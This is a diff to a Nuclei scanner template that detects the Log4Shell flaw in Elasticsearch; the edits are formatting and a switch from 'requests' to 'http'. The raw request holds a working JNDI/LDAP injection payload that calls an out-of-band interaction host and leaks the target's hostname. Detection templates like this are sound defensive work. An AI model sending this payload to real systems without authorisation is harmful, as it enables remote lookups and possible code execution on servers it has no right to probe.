@@ -1,16 +1,17 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: elasticsearch-log4j
 
 info:
   name: Java logging library log4j (version 2) was discovered that results in Remote Code Execution (RCE), by logging a certain string.
   author: c-sh0
   severity: high
-  description: Log4Shell elasticsearch detection 
+  description: Log4Shell elasticsearch detection
   reference:
     - https://github.com/elastic/elasticsearch/issues/81618
     - https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
   tags: rce,jndi,log4j,elastic,elasticsearch
 
-requests:
+http:
   - raw:
       - |
         GET /_search?source=${jndi:ldap://${hostName}.{{interactsh-url}}/x} HTTP/1.1
